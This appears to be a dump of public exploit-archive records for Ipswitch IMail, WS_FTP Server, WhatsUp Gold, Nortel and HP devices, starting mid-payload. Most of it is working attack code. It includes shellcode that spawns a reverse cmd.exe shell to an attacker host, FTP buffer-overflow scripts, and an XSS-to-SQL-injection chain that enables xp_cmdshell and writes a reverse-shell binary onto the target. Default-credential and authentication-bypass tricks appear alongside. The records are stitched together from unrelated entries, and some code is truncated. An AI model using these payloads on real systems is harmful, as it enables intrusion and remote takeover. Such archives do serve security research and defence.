""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""
""\x8b\xe7\xeb\x03\x5d\xeb\x05\xe8\xf8\xff\xff\xff\x83\xc5\x15\x90\x90\x90""
""\x8b\xc5\x33\xc9\x66\xb9\xdb\x02\x50\x80\x30\x95\x40\xe2\xfa\x2d\x95\x95""
""\x64\xe2\x14\xad\xd8\xcf\x05\x95\xe1\x96\xdd\x7e\x60\x7d\x95\x95\x95\x95""
""\xc8\x1e\x40\x14\x7f\x9a\x6b\x6a\x6a\x1e\x4d\x1e\xe6\xa9\x96\x66\x1e\xe3""
""\xed\x96\x66\x1e\xeb\xb5\x96\x6e\x1e\xdb\x81\xa6\x78\xc3\xc2\xc4\x1e\xaa""
""\x96\x6e\x1e\x67\x2c\x9b\x95\x95\x95\x66\x33\xe1\x9d\xcc\xca\x16\x52\x91""
""\xd0\x77\x72\xcc\xca\xcb\x1e\x58\x1e\xd3\xb1\x96\x56\x44\x74\x96\x54\xa6""
""\x5c\xf3\x1e\x9d\x1e\xd3\x89\x96\x56\x54\x74\x97\x96\x54\x1e\x95\x96\x56""
""\x1e\x67\x1e\x6b\x1e\x45\x2c\x9e\x95\x95\x95\x7d\xe1\x94\x95\x95\xa6\x55""
""\x39\x10\x55\xe0\x6c\xc7\xc3\x6a\xc2\x41\xcf\x1e\x4d\x2c\x93\x95\x95\x95""
""\x7d\xce\x94\x95\x95\x52\xd2\xf1\x99\x95\x95\x95\x52\xd2\xfd\x95\x95\x95""
""\x95\x52\xd2\xf9\x94\x95\x95\x95\xff\x95\x18\xd2\xf1\xc5\x18\xd2\x85\xc5""
""\x18\xd2\x81\xc5\x6a\xc2\x55\xff\x95\x18\xd2\xf1\xc5\x18\xd2\x8d\xc5\x18""
""\xd2\x89\xc5\x6a\xc2\x55\x52\xd2\xb5\xd1\x95\x95\x95\x18\xd2\xb5\xc5\x6a""
""\xc2\x51\x1e\xd2\x85\x1c\xd2\xc9\x1c\xd2\xf5\x1e\xd2\x89\x1c\xd2\xcd\x14""
""\xda\xd9\x94\x94\x95\x95\xf3\x52\xd2\xc5\x95\x95\x18\xd2\xe5\xc5\x18\xd2""
""\xb5\xc5\xa6\x55\xc5\xc5\xc5\xff\x94\xc5\xc5\x7d\x95\x95\x95\x95\xc8\x14""
""\x78\xd5\x6b\x6a\x6a\xc0\xc5\x6a\xc2\x5d\x6a\xe2\x85\x6a\xc2\x71\x6a\xe2""
""\x89\x6a\xc2\x71\xfd\x95\x91\x95\x95\xff\xd5\x6a\xc2\x45\x1e\x7d\xc5\xfd""
""\x94\x94\x95\x95\x6a\xc2\x7d\x10\x55\x9a\x10\x3f\x95\x95\x95\xa6\x55\xc5""
""\xd5\xc5\xd5\xc5\x6a\xc2\x79\x16\x6d\x6a\x9a\x11\x02\x95\x95\x95\x1e\x4d""
""\xf3\x52\x92\x97\x95\xf3\x52\xd2\x97\x80\x26\x52\xd2\x91\x55\x3d\x95\x94""
""\xff\x85\x18\x92\xc5\xc6\x6a\xc2\x61\xff\xa7\x6a\xc2\x49\xa6\x5c\xc4\xc3""
""\xc4\xc4\xc4\x6a\xe2\x81\x6a\xc2\x59\x10\x55\xe1\xf5\x05\x05\x05\x05\x15""
""\xab\x95\xe1\xba\x05\x05\x05\x05\xff\x95\xc3\xfd\x95\x91\x95\x95\xc0\x6a""
""\xe2\x81\x6a\xc2\x4d\x10\x55\xe1\xd5\x05\x05\x05\x05\xff\x95\x6a\xa3\xc0""
""\xc6\x6a\xc2\x6d\x16\x6d\x6a\xe1\xbb\x05\x05\x05\x05\x7e\x27\xff\x95\xfd""
""\x95\x91\x95\x95\xc0\xc6\x6a\xc2\x69\x10\x55\xe9\x8d\x05\x05\x05\x05\xe1""
""\x09\xff\x95\xc3\xc5\xc0\x6a\xe2\x8d\x6a\xc2\x41\xff\xa7\x6a\xc2\x49\x7e""
""\x1f\xc6\x6a\xc2\x65\xff\x95\x6a\xc3\x98\xa6\x55\x39\x10\x55\xe0\x6c\xc4""
""\xc7\xc3\xc6\x6a\x47\xcf\xcc\x3e\x77\x7b\x56\xd2\xf0\xe1\xc5\xe7\xfa\xf6""
""\xd4\xf1\xf1\xe7\xf0\xe6\xe6\x95\xd9\xfa\xf4\xf1\xd9\xfc\xf7\xe7\xf4\xe7""
""\xec\xd4\x95\xd6\xe7\xf0\xf4\xe1\xf0\xc5\xfc\xe5\xf0\x95\xd2\xf0\xe1\xc6""
""\xe1\xf4\xe7\xe1\xe0\xe5\xdc\xfb\xf3\xfa\xd4\x95\xd6\xe7\xf0\xf4\xe1\xf0""
""\xc5\xe7\xfa\xf6\xf0\xe6\xe6\xd4\x95\xc5\xf0\xf0\xfe\xdb\xf4\xf8\xf0\xf1""
""\xc5\xfc\xe5\xf0\x95\xd2\xf9\xfa\xf7\xf4\xf9\xd4\xf9\xf9\xfa\xf6\x95\xc2""
""\xe7\xfc\xe1\xf0\xd3\xfc\xf9\xf0\x95\xc7\xf0\xf4\xf1\xd3\xfc\xf9\xf0\x95""
""\xc6\xf9\xf0\xf0\xe5\x95\xed\xed\xed\xed\xed\xed\xed\xed\xed\xed\xed\x95""
""\xd6\xf9\xfa\xe6\xf0\xdd\xf4\xfb\xf1\xf9\xf0\x95\xc2\xc6\xda\xd6\xde\xa6""
""\xa7\x95\xc2\xc6\xd4\xc6\xe1\xf4\xe7\xe1\xe0\xe5\x95\xe6\xfa\xf6\xfe\xf0""
""\xe1\x95\xf6\xf9\xfa\xe6\xf0\xe6\xfa\xf6\xfe\xf0\xe1\x95\xf6\xfa\xfb\xfb""
""\xf0\xf6\xe1\x95\xe6\xf0\xfb\xf1\x95\xe7\xf0\xf6\xe3\x95\xf6\xf8\xf1\xbb""
""\xf0\xed\xf0\x95\xc9\x1d\xdc\x95\x20\x48\x54\x54\x50\x2F\x31\x2E\x30\x0d""
""\x0a\x0d\x0a"";
main(char argc, char **argv){
unsigned long ah;
unsigned short int ap;
int fd, i;
int bufsize = 1024;
int *buffer = (int *)malloc(bufsize);
struct sockaddr_in sin;
struct hostent *he;
struct in_addr in;
printf(""IMail 7.11 remote exploit (SYSTEM level)\n"");
printf(""2c79cbe14ac7d0b8472d3f129fa1df55 (c79cbe14ac7d0b8472d3f129fa1df55@yahoo.com)\n\n"");
if (argc < 5){
printf(""usage: %s <targethost> <iwebport> <localhost> <localport>\n\n"", argv[0]);
printf(""iwebport: IMail Web Messaging port (default 8383)\n\n"");
exit(-1);
ap  = htons(atoi(argv[4]));
ap ^= 0x9595;
if ((he = gethostbyname(argv[3])) == 0){herror(argv[2]);exit(-1);}
ah  = *((unsigned long *)he->h_addr);
ah ^= 0x95959595;
payload[747] = ((ap) & 0xff);
payload[748] = ((ap >> 8) & 0xff);
payload[752] = ((ah) & 0xff);
payload[753] = ((ah >> 8) & 0xff);
payload[754] = ((ah >> 16) & 0xff);
payload[755] = ((ah >> 24) & 0xff);
if((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){perror(""socket error"");exit(-1);}
if ((he = gethostbyname(argv[1])) != NULL){memcpy (&in, he->h_addr, he->h_length);}
else
if ((inet_aton(argv[1], &in)) < 0){printf(""unable to resolve host"");exit(-1);}
sin.sin_family = AF_INET;
sin.sin_addr.s_addr = inet_addr(inet_ntoa(in));
sin.sin_port = htons(atoi(argv[2]));
printf(""ret: 0x10012490 (IMailsec.dll v.2.6.17.28)\n\n"");
printf(""connecting..."");
if(connect(fd, (struct sockaddr *)&sin, sizeof(sin)) < 0){perror(""connection error"");exit(-1);}
printf(""done.\n"");
sleep(1);
printf(""dumping payload..."");
if(write(fd, payload, strlen(payload)) < strlen(payload)){perror(""write error"");exit(-1);}
printf(""done.\n\n"");
printf(""cmd.exe spawned to [%s:%s]\n\n"", argv[3], argv[4]);
close(fd);"
2002-04-15,Remote,Hardware,Michael Rawls,Nortel CVX 1800 Multi-Service Access Switch,Default SNMP Community,source: https://www.securityfocus.com/bid/4507/info,"Nortel CVX 1800 Multi-Service Access Switch is a hardware modem bank.
The device contains a default SNMP community string of ""public"", which may allow enable a remote attacker to gain access to sensitive information such as authentication credentials for local accounts on the device, network infrastructure info, etc.
The following example was provided:
snmpwalk CVX-IP-ADD-RESS public .1"
2002-02-08,Remote,Hardware,Tamer Sahin,HP AdvanceStack Switch,Authentication Bypass,"source: https://www.securityfocus.com/bid/4062/info
http://host/security/web_access.html","HP AdvanceStack 10Base-T Switching Hubs combine 10Base-T functionality with the performance of switching.
It has been reported that authentication for HP J3210A 10Base-T Switching Hubs may be bypassed by an unprivileged user who accesses one of the administrative web pages directly.
The attacker may allegedly change the superuser password of the device via this interface and gain access to the administrative facilities of the device. Additionally, authentication credentials are disclosed to the attacker.
*Reportedly, the password is stored in plain text and can be revealed by viewing the source of the web page."
2001-11-05,Remote,Windows,andreas,Ipswitch WS_FTP Server 1.0.x/2.0.x,'STAT' Remote Buffer Overflow,"source: https://www.securityfocus.com/bid/3507/info
# WS_FTP Server 2.0.3 STAT proof-of-concept exploit
# By andreas@defcom.com (C)2001
# There are a couple of things screwing up this exploit. First, the
# total number of bytes we control in the area where ESP is pointing,
# corresponds to the number of bytes in the domain name. So, to make sure
# it works on as many systems as possible, Im only using 2 bytes here.
# So, we have to jump back through the buffer... Fun.. :)
# Second, the number of bytes needed to overwrite EIP is dependant on the
# number of bytes in the server name.
# Third, the stack has to be moved to the heap, because there is no
# good place on the stack, it just ends with CreateFile overwriting stuff.
# Im using a ""jump esp"" in shlwapi.dll(0x70beed87) as the return address,
# change this if it does not work on your system.
# get servername and length of domain","WS_FTP Server, a popular FTP server for Microsoft Windows platforms, is vulnerable to a buffer overflow condition when a user submits a specially crafted legitimate FTP command. WS_FTP Server by default runs as a SYSTEM service.
If a logged in user submits a 'STAT' command along with arbitrary characters (approx 479 bytes) to a host running WS_FTP Server, this could result in the overwriting of stack variables, including the return address, and potentially the execution of arbitrary code with SYSTEM privileges.
$login=""ftp"";#username
$pass=""ftp"";#password
$ARGC=@ARGV;
if ($ARGC !=1) {
print ""WS_FTP server 2.0.3 STAT proof-of-concept exploit\n"";
print ""It creates a file named defcom.iyd in the c-root\n"";
print ""(C)2001 andreas\@defcom.com\n"";
print ""Usage: $0 <host>\n"";
print ""Example: $0 127.0.0.1\n"";
exit;
use Socket;
my($remote,$port,$iaddr,$paddr,$proto);
$remote=$ARGV[0];
$port = ""21"";
$iaddr = inet_aton($remote) or die ""Error: $!"";
$paddr = sockaddr_in($port, $iaddr) or die ""Error: $!"";
$proto = getprotobyname('tcp') or die ""Error: $!"";
socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die ""Error: $!"";
connect(SOCK, $paddr) or die ""Error: $!"";
recv(SOCK,$reply,1024,0);
@split1 = split(/\ /,$reply);
@split2 = split(/\-/,$split1[0]);
$servername = $split2[1];
$pos = index($servername,""\."");
if ($pos == -1) { print ""Error: Domain has to be atleast two characters""; exit; }
$domain = substr($servername,$pos);
if (length($domain) < 2) { print ""Error: Domain has to be atleast two characters""; exit; }
sleep(1);
$msg = ""user $login\n"";
send(SOCK, $msg, 0) or die ""Cannot send query: $!"";
$msg = ""pass $pass\n"";
sleep(1);
send(SOCK, $msg, 0) or die ""Cannot send query: $!"";
$sploit=""\xeb\x03\x5a\xeb\x05\xe8\xf8\xff\xff\xff\x8b\xc2\x83\xc0\x1a\xeb\x02\xeb\x80\x33"";
$sploit = $sploit . ""\xc9\x66\xb9\xd6\x80\x66\x81\xf1\x80\x80\x80\x30\x99\x40\xe2\xfa\x12"";
$sploit = $sploit . ""\x7b\x1a\x75\x92\x12\x75\xcb\xf1\x99\x63\x99\x99\xf1\xd9\x99\x99\x99"";
$sploit = $sploit . ""\x27\x45\x8d\xdc\x99\x66\x8f\xc3\x9c\x99\x63\x99\x99\x12\x79\x12\x75"";
$sploit = $sploit . ""\xaa\x59\xf1\x19\x99\x99\x99\xf3\x9b\xc9\xc9\xf1\x99\x99\x99\x89\x1a"";
$sploit = $sploit . ""\x5b\xfb\xcb\x27\xbd\x8c\xdc\x99\x66\x8f\xaa\x59\xc9\x27\x89\x8f\xdc"";
$sploit = $sploit . ""\x99\x66\x8f\xfa\xa3\xc5\xfd\xfc\xff\xfa\xf6\xf4\xb7\xf0\xe0\xfd\x99"";
$msg = ""stat "" . ""\x90"" x (480-length($sploit)-length($servername)) . $sploit . ""\x87\xed\xbe\x70"" . ""\x90"" x 16 . ""\xeb\x81"" . ""\r\n"";
print $msg;
sleep(1);
send(SOCK, $msg, 0) or die ""Cannot send query: $!"";
sleep(1);
exit;"
2001-07-25,Remote,Windows,andreas,Ipswitch WS_FTP Server 2.0,Anonymous Multiple FTP Command Buffer Overflows,"source: https://www.securityfocus.com/bid/3102/info
#!/usr/local/bin/perl
# WS_FTP Server 2.0.2 DELE proof-of-concept exploit
# By andreas@defcom.com and janne@defcom.com (C)2001","WS-FTP Server is vulnerable to malicious remote user input argumenting multiple FTP commands received from anonymously connecting clients.
An attacker may supply a long sequence of characters as an argument to any of the affected commands. If the length of the argumenting string exceeds the size of its input buffer, the excess data will overwrite other variables on the stack and the stack frame itself.
As a result, an attacker can replace the affected function's return address with a pointer to malicious shellcode, allowing arbitrary code to run with SYSTEM privilege.
$login=""ftp"";#username
$pass=""ftp"";#password
$ARGC=@ARGV;
if ($ARGC !=1) {
print ""WS_FTP server 2.0.2 DELE proof-of-concept exploit\n"";
print ""It creates a file named defcom.iyd in the c-root\n"";
print ""(C)2001 andreas\@defcom.com\n"";
print ""Usage: $0 <host>\n"";
print ""Example: $0 127.0.0.1\n"";
exit;
use Socket;
my($remote,$port,$iaddr,$paddr,$proto);
$remote=$ARGV[0];
$port = ""21"";
$iaddr = inet_aton($remote) or die ""Error: $!"";
$paddr = sockaddr_in($port, $iaddr) or die ""Error: $!"";
$proto = getprotobyname('tcp') or die ""Error: $!"";
socket(SOCK, PF_INET, SOCK_STREAM, $proto) or die ""Error: $!"";
connect(SOCK, $paddr) or die ""Error: $!"";
sleep(1);
$msg = ""user $login\n"";
send(SOCK, $msg, 0) or die ""Cannot send query: $!"";
$msg = ""pass $pass\n"";
sleep(1);
send(SOCK, $msg, 0) or die ""Cannot send query: $!"";
$sploit = ""\x8b\xd8\x8b\xf8\x83\xc0\x18\x33\xc9\x66\xb9\x42\x81\x66\x81\xf1\x80\x80\x80\x30\x95\x40\xe2\xfa\xde\x1e\x76"";
$sploit = $sploit . ""\x1e\x7e\x2e\x95\x6f\x95\x95\xc6\xfd\xd5\x95\x95\x95\x2b\x49\x81\xd0\x95\x6a\x83\x96\x56\x1e\x75\x1e\x7d\xa6\x55"";
$sploit = $sploit . ""\xc5\xfd\x15\x95\x95\x95\xff\x97\xc5\xc5\xfd\x95\x95\x95\x85\x14\x52\x59\x94\x95\x95\xc2\x2b\xb1\x80\xd0\x95"";
$sploit = $sploit . ""\x6a\x83\xc5\x2b\x6d\x81\xd0\x95\x6a\x83\xa6\x55\xc5\x2b\x85\x83\xd0\x95\x6a\x83"";
$msg = ""dele "" . $sploit . ""\xd4"" x (460-length($sploit)) .  ""\xf6\xaf\xc9\xf1\xf0\xf3\xf6\xfa\xf8\xbb\xfc\xec\xf1\x95"";
$msg = $msg . ""\xab\xa3\x54\x77"" . ""\xd4"" x 16 . ""\x8b\xc4\x83\xe8\x7f\x83\xe8\x7f\x83\xe8\x7f\x83\xe8\x71\xff\xe0\n"";
print $msg;
sleep(1);
send(SOCK, $msg, 0) or die ""Cannot send query: $!"";
exit;"
2000-08-30,Remote,Windows,Timescape,Ipswitch IMail 6.x,File Attachment,source: https://www.securityfocus.com/bid/1617/info,"IPSWITCH ships a product titled IMail, an email server for usage on NT servers serving clients their mail via a web interface. To this end the IMail server provides a web server typically running on port 8383 for it's end users to access. Via this interface users may read and send mail, as well as mail with file attachments. Certain versions of IMail do not perform proper access validation however resulting in users being able to attach files resident on the server. The net result of this is users may attach files on the server to which they should have no access. This access is limited to the user privileges which the server is being run as, typically SYSTEM.
It should be noted that once a user attachs the files in question the server deletes them.
Here is a sample mail header sent by IMAIL web services which
has an attachment. Please note that this is line wrapped for readability.
Date: Tue, 11 Jul 2000 13:10:28 +0200
Message-ID: <200007111310.AA2374238664@bar.com>
MIME-Version: 1.0 Content-Type: multipart/mixed;
boundary=""==IMail_v5.0==""
From: ""Timescape"" <foo@bar.com>
Reply-To: <foo@bar.com>
To: <foo@bar.com>
Subject: test
X-Mailer: <IMail v5.01>
X-Attachments: D:\IMAIL\spool\gonzo2.jpg ;
X-MimeOLE: Produced By Microsoft MimeOLE V5.00.2919.6700
Return-Path: <foo@bar.com>
X-OriginalArrivalTime: 11 Jul 2000 11:20:48.0256 (UTC) FILETIME=[10327800:01BFEB2A]
This is a multi-part message in MIME format.
--==IMail_v5.0==
Content-Type: text/plain;
charset=""iso-8859-1""
Content-Transfer-Encoding: 7bit
--==IMail_v5.0==
Content-Type: application/octet-stream;
name=""gonzo2.jpg ""
Content-Transfer-Encoding: base64
--==IMail_v5.0==--
The thing which we will be exploiting is the
X-Attachments: D:\IMAIL\spool\gonzo2.jpg ;
I made it work by modifing the compose message HTML file and
saved it locally. Then i can just arrange the path to the
attachment so that it can read
X-Attachments: D:\IMAIL\spool\..\bar\users\admin\main.mbx ;"
2012-07-22,WebApps,ASP,muts,ipswitch whatsup gold 15.02,Persistent Cross-Site Scripting / Blind SQL Injection / Remote Code Execution,"# Exploit Title: Ipswitch WhatsUp Gold 15.02 Stored XSS - Blind SQLi - RCE
# Date: Jul 22 2012
# Author: muts
# Version: Ipswitch WhatsUp Gold 15.02
# Vendor URL: http://www.ipswitch.com/
// Check if a cookie has been set (this indicates we already exploited our target)
// Or if we decided to attack anyway (by setting 'attackAnyway')
//deleteCookie(""mix0"");","An attacker can modify their snmpd.conf file with malicious JavaScript as follows:
sysName <script>alert(124)</script>pt>>
In addition, there is a Blind SQL Injection vulnerability in the file ""WrVMwareHostList.asp"". By sending a specially crafted malicious JavaScript payload, the SQLi can be exploited to add a new database administrator to the system, leading to remote code execution.
Blind SQLi Proof of Concept:
WrVMwareHostList.asp?sGroupList=1;WAITFOR DELAY '0:0:10'--&sDeviceList=3
The JavaScript code below will exploit the blind SQL injection vulnerability, enable
xp_cmdshell on the target, upload a reverse shell to the target, and execute it.
Timeline:
29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
16 Jul 2012: Email received from Ipswitch stating that the issue will be fixed ASAP
22 Jul 2012: Public Disclosure
function getCookie(c_name)
var i,x,y,ARRcookies=document.cookie.split("";"");
for (i=0;i<ARRcookies.length;i++)
x=ARRcookies[i].substr(0,ARRcookies[i].indexOf(""=""));
y=ARRcookies[i].substr(ARRcookies[i].indexOf(""="")+1);
x=x.replace(/^\s+|\s+$/g,"""");
if (x==c_name)
return unescape(y);
function deleteCookie(c_name)
setCookie(c_name, """", -1);
function setCookie(c_name,value,exdays)
var exdate=new Date();
exdate.setDate(exdate.getDate() + exdays);
var c_value=escape(value) + ((exdays==null) ? """" : ""; expires=""+exdate.toUTCString());
document.cookie=c_name + ""="" + c_value;
function getHtmlBody(url)
var xmlHttp = new XMLHttpRequest();
xmlHttp.open('GET', url, false);
xmlHttp.send(null);
var results = xmlHttp.responseText;
return(results);
var attackAnyway = 0;
if (getCookie(""mix0"") == undefined || attackAnyway == 1)
alert(""woot, new attack"");
alert(document.cookie);
setCookie(""mix0"", ""1"", 1);
alert(document.cookie);
alert(""Debug - Enabling XP_CMDSHELL"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;DECLARE @S NVARCHAR(3000);SET @S=CAST(0x45005800450043002000730070005F0063006F006E0066006900670075007200650020002700730068006F007700200061006400760061006E0063006500640020006F007000740069006F006E00730027002C00200031003B005200450043004F004E004600490047005500520045003B0045005800450043002000730070005F0063006F006E0066006900670075007200650020002700780070005F0063006D0064007300680065006C006C0027002C00200031003B005200450043004F004E004600490047005500520045003B000A AS NVARCHAR(3000));Exec (@S);--&sDeviceList=3"");
alert(""Debug - Uploading Reverse Shell"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo n 1.dll >123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0100 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0 00 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0180 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 5d cf 9f 87 19 ae f1 d4 19 ae f1 d4 19 ae f1 d4 97 b1 e2 d4 13 ae f1 d4 e5 8e e3 d4 18 ae f1 d4 52 69 63 68 19 ae f1 d4 00 00 00 00 00 00 00 00 50 45 00 00 4c 01 03 00 da 4d 03 50 00 00 00 00 00 00 00 00 e0 00 0f 01 0b 01 05 0c 00 02 00 00 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0200 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 40 00 00 00 04 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 1c 20 00 00 3c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0280 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 20 00 00 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2e 74 65 78 74 00 00 00 b8 00 00 00 00 10 00 00 00 02 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60 2e 72 64 61 74 61 00 00 d4 00 00 00 00 20 00 00 00 02 00 00 00 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 2e 64 61 74 61 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0300 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 02 02 00 00 00 30 00 00 00 02 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0380 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0400 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0480 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0500 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 66 c7 05 9e 31 40 00 02 00 66 c7 05 a0 31 40 00 11 5c c7 05 a2 31 40 00 ac 10 a4 01 c7 05 ae 31 40 00 44 00 00 00 c7 05 da 31 40 00 00 01 00 00 68 10 30 40 00 68 01 01 00 00 e8 6d 00 00 00 6a 00 6a 00 6a 00 6a 06 6a 01 6a 02 e8 56 00 00 00 8b f8 6a 10 68 9e 31 40 00 57 e8 53 00 00 00 89 3d e6 31 40 00 89 3d ea 31 40 00 89 3d ee 31 40 00 68 f2 31 40 00 68 ae 31 40 00 6a 00 6a 00 6a  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0580 >>123.hex';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 6a 01 6a 00 6a 00 68 00 30 40 00 6a 00 e8 07 00 00 00 6a 00 e8 06 00 00 00 ff 25 04 20 40 00 ff 25 00 20 40 00 ff 25 14 20 40 00 ff 25 0c 20 40 00 ff 25 10 20 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--"");
getHtmlBody(""/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0600 >>123.hex';--"");
